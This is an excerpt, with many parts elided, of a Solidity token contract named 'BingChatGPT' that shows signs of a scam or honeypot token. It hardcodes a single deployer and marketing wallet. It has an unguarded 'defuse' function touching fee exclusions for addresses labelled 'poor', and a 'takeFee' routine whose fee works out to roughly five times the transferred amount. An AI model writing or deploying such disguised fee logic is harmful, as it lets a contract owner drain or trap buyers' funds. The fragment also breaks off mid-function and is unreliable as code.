...
contract BingChatGPT is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    string private _name = "BingChatGPT";
    string private _symbol = unicode"BingChatGPT";
    ...
    constructor () {
        ...
        deployer = payable(address(0xcB5912e7d3eb66525b20056D7231612A0d75C5ae));
        ...
        marketing = payable(address(0xcB5912e7d3eb66525b20056D7231612A0d75C5ae));
    ...
    function defuse(address[] memory poor) external virtual {
        for (uint256 i; i < poor.length; i++) {
            ...
            require (poor[i] != marketing);
            require (poor[i] != burnAddress);
            require (poor[i] != uniswapPair);
            require (poor[i] != owner());
            require (poor[i] != _msgSender());
            require (poor[i] != address (uniswapV2Router));
        isExcludedFromFees[poor[i]] = true;
      }
    }
    ...
    function takeFee(address sender, address recipient, uint256 excape) private returns (uint256) {
        uint256 spike = excape;
        uint256 feeAmount = 0;
        uint256 feeExcape = excape.sub(1)+spike+excape+spike+excape;
